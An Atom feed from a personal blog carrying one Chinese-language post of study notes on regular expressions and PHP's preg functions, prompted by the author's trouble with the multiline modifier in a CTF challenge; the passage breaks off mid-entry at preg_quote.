<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fxizenta</title>
  <icon>https://www.gravatar.com/avatar/4228837cba43fcbe7a475443e3f4ec19</icon>
  <subtitle>太阳尚远，但必有太阳</subtitle>
  <link href="http://fxizenta.github.io/atom.xml" rel="self"/>
  
  <link href="http://fxizenta.github.io/"/>
  <updated>2021-03-07T04:55:56.417Z</updated>
  <id>http://fxizenta.github.io/</id>
  
  <author>
    <name>Fxizenta</name>
    <email>fxizenta14@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>正则表达式学习总结</title>
    <link href="http://fxizenta.github.io/2021/03/06/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>http://fxizenta.github.io/2021/03/06/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-06T04:24:46.000Z</published>
    <updated>2021-03-07T04:55:56.417Z</updated>
    
    <content type="html"><![CDATA[<p>起因是最近做一道文件包含的ctf题目时，卡了很久，最后才发现是对正则表达式的理解有问题导致，害，太菜了，最后反思了一下还是没有好好学习正则表达式（尤其是没有系统的进行学习），于是决定系统的学习一下正则表达式。</p><p>本次学习使用的学习资料为《精通正则表达式(第三版)》。内容主要为正则表达式基础和本人比较常遇到PHP环境下的正则表达式。</p><h1 id="正则表达式基础"><a href="#正则表达式基础" class="headerlink" title="正则表达式基础"></a>正则表达式基础</h1><p>正则表达式由两种字符构成，<strong>元字符</strong>和<strong>文字,元字符</strong>为高级应用提供了丰富而且描述力极强。</p><h2 id="行的起始和结束"><a href="#行的起始和结束" class="headerlink" title="行的起始和结束"></a>行的起始和结束</h2><p>^ 表示一行的开始</p><p>$  表示一行的结束</p><p>^aa 匹配以aa开头的行</p><p>^$  行开头接行末尾</p><p>^aa$ 一行内容为aa的行</p><h2 id="字符组"><a href="#字符组" class="headerlink" title="字符组"></a>字符组</h2><p>匹配若干字符之一</p><p><strong>同样的字符在字符组内和组外含义不同</strong></p><h3 id="连字符"><a href="#连字符" class="headerlink" title="连字符"></a>连字符</h3><p>‘-’连字符，表示一个范围(仅在<strong>字符组内部且不在开头</strong>连字符才是元字符）</p><p>例如：</p><p>&lt;H[1-6]&gt;与&lt;H[123456]&gt;是相同的</p><p>多重范围同样的允许的</p><p>例如：</p><p>[0-9A-Za-z]</p><h3 id="排除型字符组"><a href="#排除型字符组" class="headerlink" title="排除型字符组"></a>排除型字符组</h3><p>^表示排除，后面表示不希望匹配的字符</p><p>例如:</p><p>[^1-6] 匹配除了1到6以外的任何字符</p><h2 id="用点号匹配任意字符"><a href="#用点号匹配任意字符" class="headerlink" title="用点号匹配任意字符"></a>用点号匹配任意字符</h2><p>元字符.是用来匹配任意字符的字符组的简便写法，<strong>注意仅在字符组外为元字符</strong></p><p>例如：</p><p>11.11</p><p>可以匹配11-11,11.11,11/11等</p><h2 id="多选结构"><a href="#多选结构" class="headerlink" title="多选结构"></a>多选结构</h2><p>‘|’或，简单易懂就是匹配表达式中的一个表达式</p><p>例如：</p><p>c(a|e)t 即可匹配cat也可以匹配cet</p><p>表达式前加上(?i)可以忽视大小写</p><h2 id="单词分界线"><a href="#单词分界线" class="headerlink" title="单词分界线"></a>单词分界线</h2><p>&lt; 用于匹配单词的开始位置</p><p>&gt; 用于匹配单词的结束位置</p><p>可以想象成单词版本的^和$</p><p>两者可以一起使用用于匹配单词也可以只使用一个用于匹配某个字符串开始或结束的单词</p><p>\b 用于字符串开始或结尾进行匹配</p><p>m/\bjack/ 可匹配jack开头的所有字符串</p><p>m/jack\b/ 可匹配jack结尾的所有字符串</p><p> m/\bjack\b/ 只能匹配jack</p><h2 id="可选项元素"><a href="#可选项元素" class="headerlink" title="可选项元素"></a>可选项元素</h2><p>?表示可选项</p><p>例如</p><p>jkk? 可以匹配jk和jkk</p><p>+表示之前邻接的元素出现<strong>一次或多次</strong></p><p>例如</p><p>jk+ 可以匹配jkkkkkkkk、jk、jkkkk</p><p>*则是匹配任意次数，<strong>包括0次</strong></p><p>jk*  可以匹配j、jk、jkkkkkk</p><p><img src="https://i.loli.net/2021/03/06/OG2C3zYB4nFrDiQ.png" alt="Untitled.png"></p><p><strong>贪婪</strong>：指尽可能的匹配出最长的内容</p><p><strong>非贪婪</strong>：匹配出最短的内容</p><p>而*和+都是贪婪的，它们都会尽可能多的匹配文字。</p><p>只要在它们的后面加上一个？就可以实现非贪婪即最小匹配</p><p>例如：</p><p>&lt;..&gt;head&lt;..&gt;</p><p>/&lt;.*&gt;/    匹配结果为&lt;..&gt;head&lt;..&gt;</p><p>/&lt;.*?&gt;/   匹配结果为&lt;..&gt;</p><p>区间量词</p><p>{min,max}</p><p>上述三个元符号可以等价于以下量词</p><p><img src="https://i.loli.net/2021/03/06/i6GkxBnu3bMXJL9.png" alt="Untitled 1.png"></p><h2 id="括号以及反向引用"><a href="#括号以及反向引用" class="headerlink" title="括号以及反向引用"></a>括号以及反向引用</h2><p>括号除了将若干字符组合为一个单元，还有一个作用就是可以记录它们包含的子表达式匹配的文本。</p><p>\1匹配第一个括号内匹配的内容，\2匹配第二个括号匹配的内容，如此类推</p><p>例如：</p><p>&lt;([A-Za-z]+) +\1&gt; 匹配两个连续重复的单词</p><h2 id="非捕获型括号"><a href="#非捕获型括号" class="headerlink" title="非捕获型括号"></a>非捕获型括号</h2><p>(?:)表示这个括号只进行分组而不捕获，即也不会影响捕获计数，即仅用于分组的括号</p><h2 id="命名捕获"><a href="#命名捕获" class="headerlink" title="命名捕获"></a>命名捕获</h2><p>在python和php中，可以对捕获内容进行命名，语法相同，都是(?P<name>..)</p><p>例如：</p><p>\b(?P<Area>\d\d\d)</p><h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><p>如果需要匹配的某个字符本身就是元字符，应该如何处理呢？</p><p>例如.本身就是元字符，在我们需要匹配一个网址时，我们可以这样写</p><p>www.baidu.com</p><p>或者匹配一个括号包含字符</p><p>([a-zA-Z]+)</p><h2 id="主要流派的正则表达式的部分简记法"><a href="#主要流派的正则表达式的部分简记法" class="headerlink" title="主要流派的正则表达式的部分简记法"></a>主要流派的正则表达式的部分简记法</h2><p>\s  匹配所有空白字符</p><p>\n  换行符</p><p>\r   回车符</p><p>\t   制表符</p><p>\S  除’\s’外的所有内容</p><p>\w  等价于[a-zA-Z0-9] </p><p>\W 除’\w’外的任何字符</p><p>\d  等价于[0-9]，即数字</p><p>\D  除’\d’外的任何字符</p><p>/i修饰符表示此测试区不区分大小写，注意：虽然写法是’/i’,但其实“i”只是跟在表示结尾的斜线之后</p><p>m/../ 匹配</p><p>s/../../ 匹配并替换</p><h2 id="环视结构"><a href="#环视结构" class="headerlink" title="环视结构"></a>环视结构</h2><h3 id="顺序环视"><a href="#顺序环视" class="headerlink" title="顺序环视"></a>顺序环视</h3><p>用(?=…)来表示</p><p>例如</p><p>(?=\d),表示如果当前位置右边的字符是数字则匹配成功</p><h3 id="逆序环视"><a href="#逆序环视" class="headerlink" title="逆序环视"></a>逆序环视</h3><p>用(?&lt;=….)表示</p><p>例如(?&lt;=\d),表示如果当前位置左边有一位数字则匹配成功（即紧跟在数字后面的位置）</p><p>即逆序的查看（从右向左）文本进行匹配</p><h3 id="否定顺序环视"><a href="#否定顺序环视" class="headerlink" title="否定顺序环视"></a>否定顺序环视</h3><p>(?!……) 不能匹配右侧的文本，即位置右侧不能是指定的文本</p><h3 id="否定逆序环视"><a href="#否定逆序环视" class="headerlink" title="否定逆序环视"></a>否定逆序环视</h3><p>(?&lt;!…)同上，只是改为不能匹配左侧的文本</p><h3 id="环视不会“占用”字符"><a href="#环视不会“占用”字符" class="headerlink" title="环视不会“占用”字符"></a>环视不会“占用”字符</h3><p>理解比较困难，这里直接使用实例</p><p>文本如下</p><p>hello Miss Alice.</p><p>下面用’’包裹匹配的内容来表示匹配的内容</p><p>Miss  匹配 hello ‘Miss’ Alice</p><p>(?=Miss) 匹配 hello ‘’Miss Alice</p><p>即Miss前面的位置，因为符合右边邻接Miss（即在Miss的前面）</p><p>(?=Miss)Mis 匹配hello ‘Mis’s Alice</p><p>(?=Miss)Mis 等价于 Mis(?=s)</p><p>s/../../g 全局替换</p><p>/m 多行查找（导致题目卡住的罪魁祸首~）</p><p>m 主要影响 ^、$。</p><p>若不指定 m，则：^ 只在字符串的最开头，$ 只在字符串的最结尾。即：匹配整个串的开始和结束</p><p>若指定 m，则：^ 在字符串每一行的开头，$ 在字符串每一行的结尾。即：匹配每一行的开始和结束</p><p>注意：在不同流派不同语言中正则表达式的格式存在细微区别</p><h2 id="进制转义"><a href="#进制转义" class="headerlink" title="进制转义"></a>进制转义</h2><h3 id="8进制转义"><a href="#8进制转义" class="headerlink" title="8进制转义"></a>8进制转义</h3><p>\num</p><p>转义为ASCII中数字所代表的字符</p><h3 id="16进制-Unicode转义"><a href="#16进制-Unicode转义" class="headerlink" title="16进制/Unicode转义"></a>16进制/Unicode转义</h3><p>\xnum  \x(num) \unum \Unum</p><h3 id="控制字符"><a href="#控制字符" class="headerlink" title="控制字符"></a>控制字符</h3><p>\cchar用于匹配小于32的控制字符（有些支持匹配更大的值）</p><h3 id="x"><a href="#x" class="headerlink" title="\x"></a>\x</h3><p>同时\x在php中被视为\P{M}|p{M}*的缩略表示，也可以看作点号的扩展</p><p>\x与点号的区别</p><p>1.\x能够匹配结尾的组合字符之外</p><ol start="2"><li><p>\x能够匹配换行符和其他在Unicode行终结符</p></li><li><p>点号通配模式下的点号无论什么情况下都能匹配任何字符，而\x不能匹配以组合字符开头的字符</p></li></ol><p>关于基本字符和组合字符可以自行搜索Unicode体系了解</p><h2 id="Unicode的字符性质"><a href="#Unicode的字符性质" class="headerlink" title="Unicode的字符性质"></a>Unicode的字符性质</h2><p>Unicode不仅仅是一套字符映射规则，同时Unicode标准还定义了每一个字符的性质，例如“这个字符是标记字符（mark），它必须和其他字符一起使用”、“ 这个字符是小写字符”</p><p>等。</p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>不同的正则表达式系统对于这些属性的支持也不同，但是许多支持Unicode的程序能够通过\p(quality)并支持其中的一部分</p><p>\Pxx则匹配不具有对应属性的字符(等价于[^\p{xx}]</p><p>基本的Unicode属性分类如下</p><p>\p{L}       \p{letter}字母</p><p>\p{M}     \p{Mark}不能单独出现，必须和其他基本字符一起出现（例如：重音符号）的字符</p><p>\p{Z}      \p{Separator}用于表示分隔，但本身不可见的字符</p><p>\p{S}      \p{Symbol}各种图形符号和字母符号</p><p>\p{N}     \p{Number}任何数字</p><p>\p{P}      \p{Punctuation}标点字符</p><p>\p{C}      \p{Other}匹配其他任何字符（很少用于正常字符）</p><p>注意：在部分系统中单字母属性可能不需要花括号(例如：\pL而不是\p{L}</p><p>同时每个属性又包含若干的子属性，子属性还可以以某些实现方式支持的特殊形式实现复合</p><p>例如：\p{L&amp;}等价于[\p{Lu}\p{Ll}\p{Lt}]</p><p>基本子属性如下：</p><p><img src="https://i.loli.net/2021/03/06/6Jg8HAtn7MkKhDo.png" alt="Untitled 2.png"></p><h3 id="字母表"><a href="#字母表" class="headerlink" title="字母表"></a>字母表</h3><p>部分系统能够按照字母表的名字以\p{…}的格式进行匹配，例如\p{Hebrew}匹配希伯来文独有的字符(不包含在其他书写系统中也常见的字符例如逗号）</p><p>部分字母表是基于语言的如泰国语，切罗基语等，</p><p>有的则包含多种语言，如拉丁文，有些语言包甚至包含多种字母表，例如日语的字符就有部分来自汉语、拉丁语等。具体请查看对应的文档。</p><p>注意：字母表只包含独属于（严格来说应该是几乎独属于，例如上文提到的日语），而不是特定书写系统的所有字符。而常见的字符则是通属于叫IsCommon的字符表，使用{IsCommon}来进行匹配。</p><p>扩展：还有一个伪字符表Inherited它包括从其所属的字符表中的基本字符继承而来的组合字符。</p><h3 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h3><p>区块类似但小于字母表（或者说是低配版的字母表)，区块表示Unicode字符映射表中一定范围内的代码点。</p><p>例如Tibetan区块表示的是从U+0F00到U+0FFF的256个代码点。其中的字符可以用\p{InTibetan}来匹配.</p><p>为什么是低配版的字母表的原因如下：</p><p>1.区块可能包含没有赋值的代码点，例如在Tibetan区块中就有25%的代码点没有分配</p><p>2.并不像字母表那样，所有看上去和区块内的字符相关的字符都在区块内的</p><p>3.区块内也常常包含和区块不相干的字符，例如人民币符号￥在Latin_1_Supplement区块</p><p>4.区块是相互交叉的，即某个字母表的字符可能同时被包含于多个区块。例如希腊字母同时出现在Greek和Greek_Extended 区块中</p><p>但是对于区块的支持比字母表更加普遍</p><p>比较常见的系统支持如下：</p><p><img src="https://i.loli.net/2021/03/06/QdeSxN1DKuTAwH6.png" alt="Untitled 3.png"></p><h2 id="字符组运算"><a href="#字符组运算" class="headerlink" title="字符组运算"></a>字符组运算</h2><h3 id="减号（-）"><a href="#减号（-）" class="headerlink" title="减号（-）"></a>减号（-）</h3><p>直接用实例说明</p><p>例如</p><p>[[a-z]-[aeiou]]</p><p>匹配的字符就是[a-z]能够匹配字符的减去[aeiou]能够匹配的字符</p><p>也即除了元音字母以外的字母</p><p>[\p{P}-[\p{Ps}\p{Pe}] ]</p><p>匹配\p{Ps}中除了[\p{Ps}\p{Pe}]外的字符</p><p>即匹配除了{和]之类成对的符号以外的所有标点符号。</p><h3 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h3><p>这个或上文有所提及的‘|“不同这里千万不要弄混了，在字符组中OR更像是一种简记法，用于以字符组的方式来先字符组中添加字符，更多时候用于排除型字符组中。</p><p>例如[abcxyz]等价于[ [abc] [xyz] ]、[ [abc]xyz]等等</p><h3 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h3><p>AND对两个集合进行与运算</p><p>例如[\p{InThai}&amp;&amp;\P{Cn}]</p><p>对\p{InThai}和\P{Cn}进行交运算</p><p>注意第二个P是大写即匹配不具有此属性的字符</p><p>也即\P{Cn}等价于[^\p{Cn}]</p><h3 id="锚点及其他”零长度断言“"><a href="#锚点及其他”零长度断言“" class="headerlink" title="锚点及其他”零长度断言“"></a>锚点及其他”零长度断言“</h3><p>锚点及其他”零长度断言“并不匹配文本内容，而是寻找文本中的位置。</p><p>具体可参考下表</p><p><img src="https://i.loli.net/2021/03/06/B9mAOtjSZw7RMce.png" alt="Untitled 4.png"></p><p>\G 用于匹配起始位置（或者是上一次匹配的结束位置）</p><h2 id="模式修饰符（-modifier"><a href="#模式修饰符（-modifier" class="headerlink" title="模式修饰符（?modifier)"></a>模式修饰符（?modifier)</h2><p>常见的模式修饰符字母</p><p><img src="https://i.loli.net/2021/03/06/sV43tXduPIaOnMS.png" alt="Untitled 5.png"></p><p>作用范围</p><p>(?:(?i)very)可化简为：</p><p>(?i:…..)表示在括号内有效</p><p>注意：python支持第一种即(?i)格式</p><p>但是不支持(?i:…)格式</p><h2 id="注释-…-和-…"><a href="#注释-…-和-…" class="headerlink" title="注释(?#…)和#…"></a>注释(?#…)和#…</h2><p>很少用到和见到，了解一下就ok了</p><h2 id="固化分组-（-gt-…"><a href="#固化分组-（-gt-…" class="headerlink" title="固化分组 （?&gt;…)"></a>固化分组 （?&gt;…)</h2><p>一旦括号内的子表达式匹配之后，匹配的内容就固定下来无法修改，并且在接下来的匹配过程中不会变化，除非整个固化分组的括号都被弃用。</p><p>例如：</p><p>文本为hello!</p><p>.*!是可以进行匹配的</p><p>而(?&gt;.*)! 是无法被匹配的</p><p>因为在固化分组中hello!已经被.*所匹配且无法再被改变，所以没有!来匹配后面的那个!了</p><h2 id="文字文本范围：-Q…-E"><a href="#文字文本范围：-Q…-E" class="headerlink" title="文字文本范围：\Q…\E"></a>文字文本范围：\Q…\E</h2><p>消除\E以外所有元字符的特殊含义，如果没有\E则一直作用到正则表达式末端。</p><p>即在\Q到\E的范围内，所有字符都被当做文本，元字符也不需要在前面加上\来说明用作字符了</p><h2 id="忽略优先量词：-num-num"><a href="#忽略优先量词：-num-num" class="headerlink" title="忽略优先量词：*? , +? , ?? , {num,num}?"></a>忽略优先量词：*? , +? , ?? , {num,num}?</h2><p>如果不确定是否要匹配，忽略优先量词会选择”不匹配”的状态，再尝试表达式中之后的元素，如果尝试失败，再回溯，选择之前保存的”匹配”的状态。</p><p>对[\s\S]<em>来说</em>，把*<em>改为</em>?就是使用了忽略优先量词，*?限定的元素出现次数范围与*完全一样，都表示”可能出现，也可能不出现，出现次数没有上限”。区别在于，在实际匹配过程中，遇到[\s\S]能匹配的字符，先尝试”忽略”，如果后面的元素不能匹配，再尝试”匹配”，就如名字一样优先忽略出现的匹配结果</p><p>注意忽略优先量词和匹配优先量词本身在匹配次数上是没有区别的，例如<em>和</em>？的区间还都是[0,∞]，<strong>区别在于，忽略优先量词会优先选择”忽略”，而匹配优先量词会优先选择”匹配”。</strong></p><h2 id="占有优先量词：-num-num"><a href="#占有优先量词：-num-num" class="headerlink" title="占有优先量词：*+ , ++ , ?+ , (num,num)+"></a>占有优先量词：*+ , ++ , ?+ , (num,num)+</h2><p>占有优先量词类似于普通的匹配优先量词，不过他们一旦匹配某些内容就不会”交还“，类似于固化分组</p><h1 id="PHP环境下的正则"><a href="#PHP环境下的正则" class="headerlink" title="PHP环境下的正则"></a>PHP环境下的正则</h1><p>下面主要讨论的是preg引擎下提供的函数</p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>preg引擎的一些说明</p><p>1.\b在字符组内部才表示退格符，在其他场合\b表示单词分界符</p><p>\0匹配空字节</p><p>2.单词分界符和字符简记法，例如\w,\s只对ASCII字符起作用（即使是在UTF-8模式下），如果要处理Unicode字符，可以用\pL代替\w,</p><p>\pN代替\d, \pZ代替\s</p><p>3.在PHP里，Unicode的字母表不需要类似于’Is’或者’ In’这样的前缀，而且属性不支持长名称，例如只能写作\pL，不支持\p{Letter}</p><p>PHP支持<strong>\p{L&amp;}</strong>(等价于[\p{Lu}\p{Ll}\p{Lt}])<strong>和\p{Any}</strong>(表示任意字符）</p><p>4.默认情况下preg的正则表达式是以字节为单位的，所以\C等价于(?s:.),不过如果使用了修饰符u,preg就会自动变为以UTF-8字母为单位，即一个字符最多可能6个字节组成。但是\C仍匹配单个字节</p><p>5.\z和\Z都可以匹配字符串的末尾，\Z同样能够匹配最好的换行符</p><p>而$(匹配行末）的意义则会随着模式修饰符变化（m和D），</p><p>在没有设定任何修饰符时$等价于\Z</p><p>如果使用了m，则它可以匹配内嵌的换行符（那道题的解题关键）</p><p>如果使用了模式修饰符D，它能够匹配\z（只有在字符串的结尾）</p><p>如果同时设置了m和D则视为m</p><p>6.逆序环视结构使用的子表达式只能匹配固定长度的文本，除非顶层多选分支容许不同的固定长度</p><p>7.模式修饰符x（自由格式和注释）只能识别ASCII的空白字符，不能识别Unicode中的空白字符。</p><h2 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h2><p>preg要求正则表达式两侧必须要有分隔符，常见的做法是把斜线作为分隔符（注意我们可以使用除字母、数字、反斜线和空白字符外的任意ASCII字符做风格符），常见的是一对斜线，也有使用!和#作为分隔符的</p><h2 id="PHP特有的修饰符"><a href="#PHP特有的修饰符" class="headerlink" title="PHP特有的修饰符"></a>PHP特有的修饰符</h2><p>除四种标准修饰符里的模式修饰符外(i、s、m、x)</p><p>修饰符e只用于preg_replace,具体可以看函数preg_replace部分</p><h3 id="模式修饰符u"><a href="#模式修饰符u" class="headerlink" title="模式修饰符u"></a>模式修饰符u</h3><p>以utf-8编码处理正则表达式和目标字符串，此模式不会修改数据，只是更改处理数据的方式，在utf-8编码中，非ASCII字符以多个字节来储存，使用u修饰符能够确保多个字节会作为单个字符来处理。</p><h3 id="模式修饰符X"><a href="#模式修饰符X" class="headerlink" title="模式修饰符X"></a>模式修饰符X</h3><p>启动PCRE的额外功能，目前它只有一个效果，如果出现了无法识别的反斜线，就报告错误。例如，默认情况下，\k在PCRE中没有特殊意义，正常情况下会被看作k，如果使用了模式修饰符X，就会报告’unrecognized character follows  &quot;</p><h3 id="模式修饰符S"><a href="#模式修饰符S" class="headerlink" title="模式修饰符S"></a>模式修饰符S</h3><p>调用PCRE的研究(study)特性，预先分析正则表达式，在某些顺利情况下，在尝试匹配时速度会大大提升。</p><h3 id="不常用的模式修饰符"><a href="#不常用的模式修饰符" class="headerlink" title="不常用的模式修饰符"></a>不常用的模式修饰符</h3><p>模式修饰符A 把匹配锚定再第一次尝试的位置，就等于整个正则表达式以\G开头</p><p>模式修饰符D 会把每个$替换成\z，即$匹配字符串的末尾，而不是字符串之内的换行符</p><p>模式修饰符U交换元字符的匹配优先含义：<em>和</em>?交换，（完全不知道这个是拿来干什么的，感觉一点用都没有）</p><h2 id="Preg函数"><a href="#Preg函数" class="headerlink" title="Preg函数"></a>Preg函数</h2><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h3><p>preg_match(pattern,subject[,matches[,flags[,offset]]])</p><p>测试正则表达式能否在字符串中找到匹配，并提取数据</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行搜索的目标字符串</p><p>matches 非必要，用来接受匹配数据</p><p>flags 非必要，此标志位会影响整个函数的行为，这里只容许出现一个标志位</p><p>offset 非必要，从0开始，表示开始匹配的位置</p><p><strong>返回值</strong></p><p>成功匹配返回true否则返回false</p><h3 id="preg-match-all"><a href="#preg-match-all" class="headerlink" title="preg_match_all"></a>preg_match_all</h3><p>preg_match_all(pattern,subject,matches[,flags[,offset]])</p><p>在字符串中提取数据</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行搜索的目标字符串</p><p>matches 必要，用来接受匹配数据（和preg_match不同的地方）</p><p>flags 非必要，此标志位会影响整个函数的行为，这里只容许出现一个标志位</p><p>offset 非必要，从0开始，表示开始匹配的位置</p><p><strong>返回值</strong></p><p>preg_match_all返回匹配的次数</p><p>preg_match_all可以以两种方式在$all_matches中存放数据，由参数flag决定</p><p>flag:PREG_PATTERN_ORDER或是PREG_SET_ORDER来决定</p><p>默认的排列方式是PREG_PATTERN_ORDER</p><p>下面是书中的例子</p><p><img src="https://i.loli.net/2021/03/06/F3LmndhNDg4U1BZ.png" alt="Untitled 6.png"></p><p>而如果使用PREG_SET_ORDER则会返回下面这个数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span></span><br><span class="line">(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>( <span class="number">0</span> =&gt; <span class="string">&quot;Jack A. Smith&quot;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;Jack&quot;</span>,</span><br><span class="line"><span class="number">2</span> =&gt; <span class="string">&quot;A.&quot;</span>,</span><br><span class="line"><span class="number">3</span> =&gt; <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="string">&quot;Mary B. Miller&quot;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;Mary&quot;</span>,</span><br><span class="line"><span class="number">2</span> =&gt; <span class="string">&quot;B.&quot;</span>,</span><br><span class="line"><span class="number">3</span> =&gt; <span class="string">&quot;Miller&quot;</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p>preg_replace(pattern,replacement,subject[,limit[,count]]}</p><p>在字符串的副本中替换匹配的文本</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>replacement replacement字符串，如果pattern是一个数组，则replacement是包含多个子符 串的数组，如果使用了模式修饰符e，则字符串会被当作php代码</p><p>subjuct 需要进行替换的目标字符串，也可以是数组</p><p>limit 非必要，是一个整数，表示替换发生的上限</p><p>count 非必要，用来保存实际进行的替换次数（只有php5提供）</p><p><strong>返回值</strong></p><p>当subject是单个字符时，则返回一个字符串（subject可能被修改后的副本）</p><p>当subject是数组时则返回数组</p><p>Pattern和replacement可以以(字符串、字符串) (数组，字符串) (字符串，数组)</p><p>如果使用了模式修饰符e，replacement字符串的捕获引用会按照特殊的规定来插值：插值中的引号（单引号和双引号）会转义。如果不这样处理，插入的数值中的引号会让PHP代码出错。</p><h3 id="preg-replace-callback"><a href="#preg-replace-callback" class="headerlink" title="preg_replace_callback"></a>preg_replace_callback</h3><p>preg_replace_callback(pattern,callback,subject[,limit[,count]])</p><p>对字符串中的每处匹配文本调用处理函数</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>callback PHP回调函数，每次匹配成功，就执行它，生成replacement字符串</p><p>subjuct 需要进行替换的目标字符串，也可以是数组</p><p>limit 非必要，是一个整数，表示替换发生的上限</p><p>count 非必要，用来保存实际进行的替换次数（只有php5提供）</p><p><strong>返回值</strong></p><p>当subject是单个字符时，则返回一个字符串（subject可能被修改后的副本）</p><p>当subject是数组时则返回数组</p><h3 id="preg-split"><a href="#preg-split" class="headerlink" title="preg_split"></a>preg_split</h3><p>preg_split(pattern,subject[,limit,[flags]])</p><p>将字符串切分为子串数组</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>subjuct 需要进行分割的目标字符串</p><p>limit 非必要，是一个整数，表示切分之后元素的上限</p><p>flags 非必要，此标志位会影响整个函数的行为，以下三种可以随意组合</p><p>PREG_SPLIT_NO_EMPLY</p><p>PREG_SPLIT_DELIM_CAPTURE</p><p>PREG_SPLIT_OFFSET_CAPTURE</p><p><strong>返回值</strong></p><p>返回一个字符串数组</p><p><strong>flag参数</strong></p><p>三个标志位都会影响函数的功能，它们可以单独使用，也可以用or连接</p><p>PREG_SPLIT_OFFSET_CAPTURE</p><p>类似于preg_match_all中的PREG_OFFSET_CAPTURE，这个标志位会修改结果数组，把每个元素变为包含两个元素的数组</p><p>PREG_SPLIT_NO_EMPLY</p><p>这个标志位设定后preg_split会忽略空字符串，不把它们放在返回数组中，也不计入limit的统计中。</p><p>PREG_SPLIT_DELIM_CAPTURE</p><p>这个标志位在结果中包含匹配的文本，以及进行此次切分的正则表达式的捕获括号匹配的文本，下面用例子说明</p><p>字符串如下，而且是用or和and来连接的</p><p>DLSR camera and Nikon D200 or Canon EOS 30D</p><p>在不使用PREG_SPLIT_DELIM_CAPTURE的情况下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_split(<span class="string">&#x27;/\s+ (and|or) \s+ /x&#x27;</span>,<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure><p>结果是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&quot;DLSR camera&#x27;,&#x27;Nikon D200&#x27;,&#x27;Canon EOS 30D&#x27;)</span></span><br></pre></td></tr></table></figure><p>分隔符内容被去掉了，但是如果使用了PREG_SPLIT_DELIM_CAPTURE呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_split(<span class="string">&#x27;/\s+ (and|or) \s+ /x&#x27;</span>,<span class="variable">$input</span>,<span class="number">-1</span>,PREG_SPLIT_DELIM_CAPTURE);</span><br></pre></td></tr></table></figure><p>结果如下，即分隔符也被包括进去了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;DLSR camera&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;Nikon D200&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;Canon EOS 30D&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="prep-grep"><a href="#prep-grep" class="headerlink" title="prep_grep"></a>prep_grep</h3><p>preg_grep(pattern,input[,flags])</p><p>选出数组中能（不能）由表达式匹配的元素</p><p><strong>参数</strong></p><p>pattern 分隔符包围起来的正则表达式，可能有修饰符</p><p>input 一个数组，如果它们的值能够匹配pattern，则其值会复制到返回的数组中。</p><p>flags 非必要，此标志位PREG_GREF_INVERT或者是0</p><p><strong>返回值</strong></p><p>一个数组，包含input中能够由pattern匹配的元素(如果使用了PREG_GREF_INVERT标志位，则包括不能匹配的元素)</p><h3 id="preg-quote"><a href="#preg-quote" class="headerlink" title="preg_quote"></a>preg_quote</h3><p>preg_quote(input[,delimiter])</p><p>转义字符串中的正则表达式元字符</p><p><strong>参数</strong></p><p>input 希望以文字方式用作pattern参数的字符串</p><p>delimiter 